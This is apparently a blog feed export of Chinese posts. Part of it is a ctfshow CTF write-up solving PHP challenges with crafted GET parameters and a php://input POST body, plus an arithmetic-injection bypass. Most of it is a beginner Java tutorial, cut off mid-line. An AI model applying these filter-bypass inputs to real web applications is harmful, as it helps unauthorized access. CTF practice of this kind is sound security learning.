<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//$flag=&#x27;ctfshow&#123;d78ac2f0-9b57-4159-a162-6b944e7b495b&#125;&#x27;;</span><br><span class="line">|a:5:&#123;s:10:&quot;start_time&quot;;i:1721961458;s:14:&quot;content_length&quot;;i:51487;s:15:&quot;bytes_processed&quot;;i:5259;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:10:&quot;Gu0f3n.txt&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1721961458;s:15:&quot;bytes_processed&quot;;i:5259;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow摆烂杯复现</title>
    <url>/2024/07/28/ctfshow%E6%91%86%E7%83%82%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="一行代码"><a href="#一行代码" class="headerlink" title="一行代码"></a>一行代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">\# -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Date</span>:  2021-11-18 21:25:22</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified by:  h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified time: 2021-11-18 22:14:12</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> !(!(<span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>)||(!<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>))||<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="string">&#x27;.&#x27;</span>)||(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]!=<span class="number">0</span>)||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])&lt;=<span class="number">7</span>)||(!<span class="title function_ invoke__">eregi</span>(<span class="string">&quot;ctfsho&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>],<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;ctfshow&quot;</span>))||<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>],<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&#x27;w&#x27;</span>||(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="string">&#x27;r&#x27;</span>) !== <span class="string">&quot;welcome2ctfshow&quot;</span>))?<span class="variable">$flag</span>:<span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>), <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>分析下源码</p>
<ol>
<li>成功包含 <code>flag.php</code> 文件。</li>
<li>错误报告已关闭。</li>
<li><code>$_GET[&#39;filename&#39;]</code> 中不包含 <code>.</code>。</li>
<li><code>$_GET[&#39;id&#39;]</code> 等于 <code>0</code>。</li>
<li><code>$_GET[&#39;content&#39;]</code> 的长度大于7。</li>
<li><code>$_GET[&#39;content&#39;]</code> 的第一个字符与 <code>ctfshow</code> 匹配。</li>
<li><code>$_GET[&#39;content&#39;]</code> 的第一个字符不为 <code>w</code>。</li>
<li><code>$_GET[&#39;filename</code> 的内容为 <code>welcome2ctfshow</code>。</li>
</ol>
<p>如果所有这些条件都满足，则输出 <code>$flag</code></p>
<p>id&#x3D;0没什么讲的 cotent内容大于7.且第一个字母不为w,但又要与welcome 第一个字符一样</p>
<p>搜索下eregi(string,string)</p>
<p>发现作用就是用来进行字符串匹配的，但是他不区分大小写，所以这里我们直接第一个字母大写W就好了</p>
<p>filename 要为welcome2ctfshow 但不能直接俄get传 因为这样会把整个文件读入</p>
<p>所有用伪协议php:&#x2F;&#x2F;input</p>
<p>让后POST提交welcome2ctfshow</p>
<p>GET: ?id&#x3D;0&amp;content&#x3D;W2Gu0f3n&amp;filename&#x3D;php:&#x2F;&#x2F;input</p>
<p>POST:welcome2ctfshow</p>
<p><img src="/imgs/2024%E5%B9%B47%E6%9C%8828%E6%97%A510%E7%82%B924%E5%88%86.png" alt="image-20240728102150005"></p>
<h2 id="黑客网站"><a href="#黑客网站" class="headerlink" title="黑客网站"></a>黑客网站</h2><p>打开其实就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tyro s4qw s3mm bubg jqje 46nc v35j aqjg eb3n qiuf 23ij oj4z wasx ohyd onion</span><br></pre></td></tr></table></figure>

<p>循环 看到 onion 应该都不陌生</p>
<p>下载洋葱浏览器直接搜就是了，但是洋葱都知道是干嘛的吧（(●’◡’●)）</p>
<h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><p>计算方式为(A)**3+(B)**3+(c)**3</p>
<p>用括号绕过即可，</p>
<p>a&#x3D;+114)+(0</p>
<p>b和c都为-0就可以</p>
<p>(+114)+(0)**3+(-0)**3+(-0)**3 &#x3D;114</p>
<h2 id="登陆不了"><a href="#登陆不了" class="headerlink" title="登陆不了"></a>登陆不了</h2><p>注册发现验证码没用到</p>
<p>打开验证码图片位置</p>
<p>确定存在任意文件读取漏洞</p>
<p>ok，不会了 gg 提桶跑路 ヾ(•ω•&#96;)o</p>
<p>哈哈哈 还是得好好复现（之后补上嘿嘿）</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>java基础</title>
    <url>/2024/09/10/java%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>1.安装jdk和IDEA</p>
<p>2.创建自己的第一个项目</p>
<p>3.编写自己的第一段代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello.world&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hello.world</span></span><br></pre></td></tr></table></figure>

<p>注释</p>
<p>单行注释 &#x2F; &#x2F;</p>
<p>多行注释&#x2F;**&#x2F;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n;</span><br><span class="line"><span class="comment">//这是我的第一段代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test01</span> &#123;</span><br><span class="line">    <span class="comment">//main方法是程序的入口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//在控制台上进行打印</span></span><br><span class="line">        System.out.println(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">多行注释</span></span><br><span class="line"><span class="comment">随便打一些东西</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常用快捷键：</span><br><span class="line">main方法快捷键：psvm+回车</span><br><span class="line">控制台原样输出：sout+回车</span><br><span class="line">删除一行：ctrl+y</span><br><span class="line">复制—行：ctrl+d</span><br></pre></td></tr></table></figure>

<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量的含义</p>
<p>变量本质上就是代表一个”可操作的存储空间”，空间位置是确定<br>的，但是里面放置什么值不确定。我们可通过变量名来访问“对应<br>的存储空间”，从而操纵这个“存储空间”存储的值。Java是一种<br>强类型语言，每个变量都必须声明其数据类型。变量的数据类型决<br>定了变量占据存储空间的大小。</p>
<p>变量的学习</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">步骤1：变量的声明</span><br><span class="line">type varName [=value][,varName[=value]...];</span><br><span class="line">注意：变量不可以重复定义</span><br><span class="line">步骤2：变量的赋值</span><br><span class="line">注意：变量的声明和赋值可以在同一行表示</span><br><span class="line">步骤3：变量的使用</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTvar</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.变量的声明（定义）</span></span><br><span class="line">        <span class="comment">//定义一个名字的变量</span></span><br><span class="line">        String name;<span class="comment">//定义一个变量为name，类型为string</span></span><br><span class="line">        <span class="comment">// 注意：变量不可重复定义</span></span><br><span class="line">        <span class="type">int</span> a,b;<span class="comment">//同时可以定义多个变量</span></span><br><span class="line">        name=<span class="string">&quot;Gu0f3n&quot;</span>;<span class="comment">//等号赋值</span></span><br><span class="line">        <span class="comment">//2.变量的赋值</span></span><br><span class="line">        <span class="type">int</span> age;</span><br><span class="line">        age=<span class="number">18</span>;<span class="comment">//等号赋值</span></span><br><span class="line">        age=<span class="number">32</span>;</span><br><span class="line">        age=<span class="number">40</span>+<span class="number">18</span>;</span><br><span class="line">        <span class="comment">//变量的定义和复制可以写在同一行</span></span><br><span class="line">        <span class="type">int</span> age1=<span class="number">19</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> e,f =<span class="number">30</span>;<span class="comment">//e没有赋值，f赋值30</span></span><br><span class="line">        <span class="comment">//变量的使用</span></span><br><span class="line">        System.out.println(age);<span class="comment">//使用变量的时候通过名字访问到空间中具体的值</span></span><br><span class="line">        <span class="type">int</span> g=<span class="number">20</span>;</span><br><span class="line">        System.out.println(age+g);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">控制台的打印结果</span></span><br><span class="line"><span class="comment">58</span></span><br><span class="line"><span class="comment">78</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型的分类</p>
<p>Java是一种强类型语言，每个变量都必须声明其数据类型<br>Java的数据类型可分为两大类：基本数据类型（primitivedata<br>type）和弓l用数据类型（reference data type）</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_19.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTtype</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//基本数据类型</span></span><br><span class="line">        <span class="comment">//1.整数类型</span></span><br><span class="line">        <span class="type">byte</span> <span class="variable">a</span> <span class="operator">=</span><span class="number">10</span>;<span class="comment">//表述范围-128~127</span></span><br><span class="line">        <span class="type">short</span> <span class="variable">b</span> <span class="operator">=</span><span class="number">22000</span>;<span class="comment">//表述范围：正负三万</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span><span class="number">30123131</span>;<span class="comment">//正负21亿</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">d</span> <span class="operator">=</span><span class="number">401215151513131513L</span>;<span class="comment">//表述范围 很大 如果表示的数的范围超过intl类型范围就需要加L</span></span><br><span class="line">        <span class="comment">//2.浮点类型</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">e</span> <span class="operator">=</span><span class="number">3.14f</span>;<span class="comment">//如果float表示一个小数，后面必须加上f</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">f</span> <span class="operator">=</span><span class="number">4.56789</span>;</span><br><span class="line">        <span class="comment">//3.字符类型</span></span><br><span class="line">        <span class="type">char</span> <span class="variable">g</span> <span class="operator">=</span><span class="string">&#x27;a&#x27;</span>;<span class="comment">//单引号引起来的单个字符</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Gu0f3n&quot;</span>);<span class="comment">//后续的字符串</span></span><br><span class="line">        <span class="comment">//4.布尔类型</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span><span class="literal">true</span>;<span class="comment">//true and false</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_27.png" alt="img"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTope</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.算数运算符</span></span><br><span class="line">        <span class="comment">//加号 1.表示正数2.相加 3.字符串拼接</span></span><br><span class="line">        System.out.println(+<span class="number">10</span>);</span><br><span class="line">        System.out.println(<span class="number">5</span>+<span class="number">6</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;输出一个数&quot;</span>+num);</span><br><span class="line">        System.out.println(<span class="string">&quot;abc&quot;</span>+<span class="number">5</span>+<span class="number">6</span>);</span><br><span class="line">        <span class="comment">//只要+左右两侧任意一侧是字符串，那么结果就是字符串</span></span><br><span class="line">        <span class="comment">//++自增</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span><span class="number">85</span>;</span><br><span class="line">        a++;</span><br><span class="line">        <span class="type">int</span> b=<span class="number">85</span>;</span><br><span class="line">        ++b;<span class="comment">//无论++放在变量前还是后都是+1</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        a=<span class="number">5</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> a++ + <span class="number">7</span>;<span class="comment">//如果++在变量的后面 先运算后加1，m=a+7 a+1</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(m);</span><br><span class="line">        a=<span class="number">5</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> ++a + <span class="number">7</span>;<span class="comment">//++在变量前，先加1，在运算，a=a+1,n=a+7</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(n);</span><br><span class="line">    &#125;<span class="comment">//程序入口</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">10</span></span><br><span class="line"><span class="comment">11</span></span><br><span class="line"><span class="comment">输出一个数10</span></span><br><span class="line"><span class="comment">abc56</span></span><br><span class="line"><span class="comment">86</span></span><br><span class="line"><span class="comment">86</span></span><br><span class="line"><span class="comment">6</span></span><br><span class="line"><span class="comment">12</span></span><br><span class="line"><span class="comment">6</span></span><br><span class="line"><span class="comment">13</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTOPe2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//赋值运算符 =</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num2</span> <span class="operator">=</span><span class="number">20</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num3</span> <span class="operator">=</span><span class="number">10</span>+<span class="number">30</span>;</span><br><span class="line">        <span class="comment">//求和</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">        sum+=num1;</span><br><span class="line">        sum+=num2;<span class="comment">//sum=sum+num2;</span></span><br><span class="line">        sum+=num3;<span class="comment">//sum=sum+num3;</span></span><br><span class="line">        System.out.println(<span class="string">&quot;和：&quot;</span>+sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#和：<span class="number">70</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTope3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//关系运算符==，最终结果是布尔值，不是true就是false</span></span><br><span class="line">        System.out.println(<span class="number">5</span>==<span class="number">6</span>);</span><br><span class="line">        System.out.println(<span class="number">5</span>==<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//逻辑运算符：逻辑运算符左右连接的是布尔值</span></span><br><span class="line">        System.out.println(<span class="literal">false</span>&amp;&amp;<span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="literal">true</span>&amp;&amp;<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//&amp;&amp;逻辑 都是ture 则为true 有一个false都为false</span></span><br><span class="line">        System.out.println(<span class="literal">false</span>&amp;&amp;<span class="literal">false</span>);</span><br><span class="line">        System.out.println(<span class="literal">true</span>&amp;&amp;<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//||逻辑 如果都为false 结果都为false</span></span><br><span class="line">        System.out.println(<span class="literal">false</span>||<span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="literal">true</span>||<span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="literal">false</span>||<span class="literal">false</span>);</span><br><span class="line">        System.out.println(<span class="literal">true</span>||<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">控制台结果：</span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">作用：流程控制语句是用来控制程序中各语句执行顺序的语</span><br><span class="line">句，可以把语句组合成能完成一定功能的小逻辑模块</span><br></pre></td></tr></table></figure>

<p>分类</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_28.png"></p>
<h2 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h2><p>if单分支</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_29.png" alt="img"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTif01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//需求 判断一个数是否大于0</span></span><br><span class="line">        <span class="comment">//给定一个数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span><span class="number">13</span>;</span><br><span class="line">        <span class="comment">//判定</span></span><br><span class="line">        <span class="keyword">if</span>(num &gt;<span class="number">10</span>)&#123;<span class="comment">//if 后面是一个表达式，true or false ,只有为true才会返回&#123;&#125;</span></span><br><span class="line">            System.out.println(<span class="string">&quot;这个数字大于10&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>if双分支</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_31.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTif02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//需求是否大于10</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span><span class="number">8</span>;</span><br><span class="line">        <span class="keyword">if</span>(num &gt;<span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这个数字大于10&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这个数小于等于10&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>if多分支</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_32.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTif03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//判断学生成绩的等级</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span><span class="number">84</span>;<span class="comment">//给定学生一个等级</span></span><br><span class="line"><span class="comment">//        if(score&gt;90)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(&quot;该学生的等级为A&quot;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        if(score&gt;80 &amp;&amp; score&lt;90)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(&quot;该学生的等级为B&quot;);</span></span><br><span class="line"><span class="comment">//        &#125;if(score&gt;70 &amp;&amp; score&lt;80)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(&quot;该学生的等级为C&quot;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="comment">//多分枝结构解决问题</span></span><br><span class="line">        <span class="keyword">if</span> (score &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;该学生的等级为A&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;该学生的等级为B&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;该学生的等级为C&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;该学生的等级为D&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//兜底</span></span><br><span class="line">            System.out.println(<span class="string">&quot;该学生的等级为E&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><p> while循环<img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_33.png" alt="img"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span><span class="number">1</span>;<span class="comment">//条件初始化</span></span><br><span class="line"><span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (num&lt;=<span class="number">5</span>) &#123;<span class="comment">//如果表达式结果为true，那么就变成死循环//判断</span></span><br><span class="line">            sum = sum + num;<span class="comment">//循环体</span></span><br><span class="line">            num++;<span class="comment">//迭代</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<p>num&lt;&#x3D;5-&gt;true,sum:1，num:2-&gt;第一次循环结束<br>num&lt;&#x3D;5-&gt;true,sum：3，num：3-&gt;第二次循环结束<br>num&lt;&#x3D;5-&gt;true,sum：6，num：4-&gt;第三次循环结束<br>num&lt;&#x3D;5-&gt;true,sum:10,num：5-&gt;第四次循环结束<br>num&lt;&#x3D;5-&gt;true,sum:15;num:6-&gt;第五次循环结束<br>m&lt;&#x3D;5-&gt;false-&gt;循环停止</p>
<p>for循环</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> num=<span class="number">1</span>;num&lt;=<span class="number">5</span>;num++) &#123;<span class="comment">//1.条件初始，条件判断，迭代</span></span><br><span class="line">    sum = sum + num;<span class="comment">//循环体</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;和为&quot;</span>+sum</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="方法和方法重载"><a href="#方法和方法重载" class="headerlink" title="方法和方法重载"></a>方法和方法重载</h2><p>方法</p>
<p>就是一段用来完成特定功能的代码片段</p>
<p>例如psvm，sout</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方法声明格式</span><br><span class="line">修饰符1修饰符2]返回值类型方法名（形式对象名.方法名（实参列表）</span><br><span class="line">方法调用方式</span><br><span class="line">方法名（实参列表）（参数列表）</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTmethod</span> &#123;</span><br><span class="line">    <span class="comment">//提取一个方法， 将两个数求和</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">addNum</span><span class="params">(<span class="type">int</span> num1 ,<span class="type">int</span> num2)</span>&#123;</span><br><span class="line">            <span class="comment">//求和</span></span><br><span class="line"></span><br><span class="line">             <span class="type">int</span> sum=num1+num2;</span><br><span class="line">             <span class="keyword">return</span> sum;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//10，20</span></span><br><span class="line">         <span class="type">int</span> a=addNum(<span class="number">10</span>,<span class="number">20</span>);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="comment">//30，20</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> addNum(<span class="number">30</span>,<span class="number">20</span>);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        <span class="comment">//40，8186</span></span><br><span class="line">         addNum(<span class="number">40</span>,<span class="number">8186</span>);</span><br><span class="line">        System.out.println(addNum(<span class="number">40</span>,<span class="number">8186</span>));</span><br><span class="line">        <span class="comment">//1.方法 提高代码的复用性，写一次 直接调用即可</span></span><br><span class="line">    &#125;   <span class="comment">//public static  方法的修饰符</span></span><br><span class="line">        <span class="comment">// int 方法的返回值类型   方法返回值对应的数据类型</span></span><br><span class="line">    <span class="comment">// addNum 见名知意</span></span><br><span class="line">    <span class="comment">// num1 num2 形式参数列表 形参</span></span><br><span class="line">    <span class="comment">//10 20  实参</span></span><br><span class="line">    <span class="comment">//return sum; 方法的最后有方法的返回值（可有）如果没有返回值 方法申明出 加上void</span></span><br><span 